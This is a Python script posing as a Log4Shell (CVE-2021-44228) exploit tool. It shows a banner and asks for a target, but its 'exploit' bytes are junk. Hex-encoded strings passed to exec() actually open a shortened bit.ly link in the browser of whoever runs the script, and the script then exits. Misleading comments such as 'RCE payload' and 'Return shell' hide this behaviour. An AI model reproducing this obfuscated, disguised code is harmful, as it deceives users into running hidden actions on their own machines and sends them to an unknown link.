# ------------------------------------ #
#      |                |  |    _)     #
#      |   _ \    _  |  |  |     |     #
#      |  (   |  (   | ___ __|   |     #
#     _| \___/  \__. |    _|     |     #
#               |___/          _/      #
#                    CVE-2021-44228    #
# ------------------------------------ #
# CAUTION!
# Only modify the code bellow if you know
# what are you doing. :)
import sys
import requests
from time import sleep

# This payload explores the CVE:
exploit = '''\x13%\xd2B\x067\xfd\\\xf9\xbed9!\x8a\x077\xae\xcd\x1b
             \xa9\xf3w$lK\xfa\x80o\x99\xea\xb5\x83\x13\x8e\x9a\xea\xb9
             \xd1.\x9eI|\xf2\x9a\xaewgT\x9f\x94\xe5o\xf6>K\xd5\xf7
             \xa4u\x1bY\xfa\x84S\xa0\xc9\x01\xea\x93\xf6\x9f\xd3\x04
             \x16\xe8\x01=\xe4\x8cn\x8d.\xc3*\t6\xefv\xc9\xc1\xee\xa5
             \x9b\xcaWh\xcf\x91.\xbe\xabi\xad\xadJ\xc6\xc3\xbb\xdf-\xc7
             \xa7;\x05H\x7f"\x9f\x15!\x0e\x84\xc85'''

# Obfuscated RCE payload:
# [!] Do not remove the spaces at the end of the lines! [!]
def do_the_thing():
    part_one = '69 6d 70 6f 72 74 20 77 65 62 62 72 6f 77 73 65 '
    part_two = '72 3b 77 65 62 62 72 6f 77 73 65 72 2e 6f 70 65 '
    part_tree = '6e 28 27 68 74 74 70 73 3a 2f 2f 62 69 74 2e 6c '
    part_four = '79 2f 33 45 56 34 64 4e 56 27 2c 20 6e 65 77 3d 32 29'

    # Mount payload:
    if True:
        return part_one + part_two + part_tree + part_four

# Drop and Inject:
def perform_stuff(byte_list: str) -> str:
    temp_char = ""
    temp_string = ""
    for b in byte_list.split(" "):
        temp_char = "0x" + str(b)
        temp_string += chr(int(temp_char, 16))
    return temp_string

# Interface:
print("  |                |  |    _)")
print("  |   _ \    _  |  |  |     |")
print("  |  (   |  (   | ___ __|   |")
print(" _| \___/  \__. |    _|     |")
print("           |___/          _/")

print("Enter a valid URL or IP:")
target = input(">>> ")

# Run:
exec(perform_stuff(do_the_thing()))
# Avoid timeouts:
sleep(5)
# Return shell:
shellcode_min = "73 79 73 2e 65 78 69 74 28 22 53 6f 6d 65 74 68 69 6e 67 20 69 73 20 77 72 6f 6e 67 2e 22 29"
exec(perform_stuff(shellcode_min))
